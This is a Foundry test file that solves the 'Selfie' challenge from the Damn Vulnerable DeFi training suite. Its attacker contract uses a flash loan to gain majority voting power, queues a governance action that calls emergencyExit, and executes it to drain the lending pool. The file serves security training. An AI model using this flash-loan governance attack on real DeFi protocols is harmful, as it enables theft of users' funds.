// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
import {
    FlashLoanReceiver
} from "../../src/naive-receiver/FlashLoanReceiver.sol";
import {
    IERC3156FlashBorrower
} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {
    IERC3156FlashLender
} from "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";

contract SelfieAttacker is IERC3156FlashBorrower {
    bytes32 private constant CALLBACK_SUCCESS =
        keccak256("ERC3156FlashBorrower.onFlashLoan");

    SelfiePool public immutable pool;
    SimpleGovernance public immutable governance;
    DamnValuableVotes public immutable token;
    address public immutable recovery;

    uint256 public actionId;

    constructor(
        SelfiePool _pool,
        SimpleGovernance _governance,
        DamnValuableVotes _token,
        address _recovery
    ) {
        pool = _pool;
        governance = _governance;
        token = _token;
        recovery = _recovery;
    }

    /// @notice start the flash loan for amount
    function takeLoan(uint256 amount) external {
        IERC3156FlashLender(address(pool)).flashLoan(
            IERC3156FlashBorrower(address(this)),
            address(token),
            amount,
            bytes("") // unused
        );
    }

    /// @notice ERC-3156 callback invoked by the pool
    function onFlashLoan(
        address, // initiator (unused)
        address tokenAddress,
        uint256 amount,
        uint256, // fee (0)
        bytes calldata // data (unused)
    ) external override returns (bytes32) {
        require(msg.sender == address(pool), "only pool");
        require(tokenAddress == address(token), "wrong token");

        // get voting power from the borrowed tokens
        token.delegate(address(this));

        // build calldata for emergencyExit(address)
        bytes memory drainCalldata = abi.encodeWithSignature(
            "emergencyExit(address)",
            recovery
        );

        // queue the governance action using the exact typed signature the challenge expects:
        // queueAction(address target, uint128 value, bytes calldata data)
        // this call will revert unless this contract has > 50% of total votes (it does while holding the flash loan)
        actionId = governance.queueAction(
            address(pool),
            uint128(0),
            drainCalldata
        );

        // approve pool to pull tokens back and repay flash loan
        IERC20(tokenAddress).approve(address(pool), amount);

        return CALLBACK_SUCCESS;
    }

    /// @notice execute the queued action after governance delay has passed
    function execute() external {
        governance.executeAction(actionId);
    }
}

contract SelfieChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 constant TOKENS_IN_POOL = 1_500_000e18;

    DamnValuableVotes token;
    SimpleGovernance governance;
    SelfiePool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableVotes(TOKEN_INITIAL_SUPPLY);

        // Deploy governance contract
        governance = new SimpleGovernance(token);

        // Deploy pool
        pool = new SelfiePool(token, governance);

        // Fund the pool
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(address(pool.governance()), address(governance));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(pool.maxFlashLoan(address(token)), TOKENS_IN_POOL);
        assertEq(pool.flashFee(address(token), 0), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_selfie() public checkSolvedByPlayer {
        // deploy attacker as player
        SelfieAttacker attacker = new SelfieAttacker(
            pool,
            governance,
            token,
            recovery
        );

        // take the max available flash loan
        uint256 amount = pool.maxFlashLoan(address(token));
        attacker.takeLoan(amount);

        // fast-forward past governance delay (SimpleGovernance uses 2 days)
        vm.warp(block.timestamp + governance.getActionDelay() + 1);

        // execute the queued action
        attacker.execute();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player has taken all tokens from the pool
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(
            token.balanceOf(recovery),
            TOKENS_IN_POOL,
            "Not enough tokens in recovery account"
        );
    }
}
